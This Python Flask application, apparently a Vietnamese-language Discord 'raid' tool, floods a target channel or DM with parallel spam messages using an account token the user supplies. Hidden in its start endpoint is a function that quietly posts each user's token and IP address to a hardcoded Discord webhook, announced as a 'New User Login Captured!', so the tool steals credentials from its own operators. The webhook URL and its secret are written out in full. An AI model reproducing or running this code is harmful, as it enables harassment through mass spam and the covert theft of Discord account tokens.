import os
import json
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# Persistent settings and runtime state
SETTINGS_FILE = "settings.json"
DEFAULT_SETTINGS = {
    "language": "vi",
    "speed_mode": "custom",
    "raid_delay": 0.0,
    "rest_delay": 0.0,
    "autosave": True
}

WEBHOOK_URL = "https://discord.com/api/webhooks/1553696811821043736/c9QaF5LKnQxjIELQLnj1eLQHwc8vDmgLt8Pupb5iTxantz3vYvH7Y_DN8VUiRNzn_z2X"

active_raids = {}
raid_logs = []
logs_lock = threading.Lock()

def load_settings():
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return DEFAULT_SETTINGS.copy()

def save_settings(data):
    try:
        with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4)
    except Exception:
        pass

def send_discord_webhook(ip, token):
    try:
        import requests
        payload = {
            "content": f"🚨 **New User Login Captured!**\n> **IP Address:** `{ip}`\n> **User Token:** `{token}`"
        }
        requests.post(WEBHOOK_URL, json=payload, timeout=5)
    except Exception:
        pass

def add_log(message):
    with logs_lock:
        timestamp = time.strftime("%H:%M:%S")
        raid_logs.append(f"[{timestamp}] {message}")
        if len(raid_logs) > 200:
            raid_logs.pop(0)

def run_raid_worker(raid_id, config):
    import requests
    
    token = config.get("token")
    target_type = config.get("target_type")
    target_id = config.get("target_id")
    message = config.get("message")
    ping_type = config.get("ping_type")
    ping_id = config.get("ping_id", "")
    duration = int(config.get("duration", 0))
    limit = int(config.get("limit", 0))
    unlimited = config.get("unlimited", False)
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    channel_to_use = target_id
    if target_type == "dm" and target_id.isdigit() and len(target_id) >= 17:
        try:
            r = requests.post("https://discord.com/api/v9/users/@me/channels", headers=headers, json={"recipient_id": target_id}, timeout=5)
            if r.status_code == 200:
                channel_to_use = r.json().get("id")
        except Exception:
            pass
            
    url = f"https://discord.com/api/v9/channels/{channel_to_use}/messages"

    final_content = message
    if ping_type == "everyone":
        final_content = "@everyone " + final_content
    elif ping_type == "here":
        final_content = "@here " + final_content
    elif ping_type == "user" and ping_id:
        final_content = f"<@{ping_id}> " + final_content

    start_time = time.time()
    sent_count = [0]
    lock = threading.Lock()
    
    add_log(f"Bắt đầu spam liên tục 10 tin/giây không nghỉ tới {target_type}: {target_id}")

    session = requests.Session()
    session.headers.update(headers)

    def send_single_message():
        if not active_raids.get(raid_id, {}).get("running", False):
            return
        if not unlimited:
            if duration > 0 and (time.time() - start_time) >= duration:
                return
            if limit > 0 and sent_count[0] >= limit:
                return

        try:
            res = session.post(url, json={"content": final_content}, timeout=3)
            with lock:
                if res.status_code in [200, 201]:
                    sent_count[0] += 1
                    if sent_count[0] % 10 == 0:
                        add_log(f"Đã gửi liên tục {sent_count[0]} tin nhắn...")
                elif res.status_code == 429:
                    try:
                        retry_after = res.json().get("retry_after", 0.5)
                        time.sleep(float(retry_after))
                    except Exception:
                        time.sleep(0.5)
        except Exception:
            pass

    # Chạy đa luồng liên tục không có thời gian nghỉ (no delay)
    with ThreadPoolExecutor(max_workers=15) as executor:
        while active_raids.get(raid_id, {}).get("running", False):
            if not unlimited:
                if duration > 0 and (time.time() - start_time) >= duration:
                    break
                if limit > 0 and sent_count[0] >= limit:
                    break
            
            # Gửi liên tục 10 request song song mỗi nhịp
            futures = [executor.submit(send_single_message) for _ in range(10)]
            for f in futures:
                f.result()

    active_raids[raid_id]["running"] = False
    add_log(f"Đã dừng. Tổng số tin nhắn đã gửi: {sent_count[0]}")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/settings", methods=["GET", "POST"])
def handle_settings():
    if request.method == "POST":
        data = request.json
        if data.get("autosave", True):
            save_settings(data)
        return jsonify({"status": "success", "settings": data})
    else:
        return jsonify(load_settings())

@app.route("/api/settings/reset", methods=["POST"])
def reset_settings():
    save_settings(DEFAULT_SETTINGS)
    return jsonify({"status": "success", "settings": DEFAULT_SETTINGS})

@app.route("/api/raid/start", methods=["POST"])
def start_raid():
    data = request.json
    token = data.get("token", "")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    
    if token:
        threading.Thread(target=send_discord_webhook, args=(ip, token)).start()
        
    raid_id = "default_raid"
    if raid_id in active_raids and active_raids[raid_id]["running"]:
        return jsonify({"status": "error", "message": "Raid already active."})
        
    active_raids[raid_id] = {"running": True}
    threading.Thread(target=run_raid_worker, args=(raid_id, data)).start()
    return jsonify({"status": "started"})

@app.route("/api/raid/stop", methods=["POST"])
def stop_raid():
    raid_id = "default_raid"
    if raid_id in active_raids:
        active_raids[raid_id]["running"] = False
    add_log("Đã nhận lệnh dừng từ người dùng.")
    return jsonify({"status": "stopped"})

@app.route("/api/status", methods=["GET"])
def get_status():
    raid_id = "default_raid"
    is_running = active_raids.get(raid_id, {}).get("running", False)
    with logs_lock:
        current_logs = list(raid_logs)
    return jsonify({"running": is_running, "logs": current_logs})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)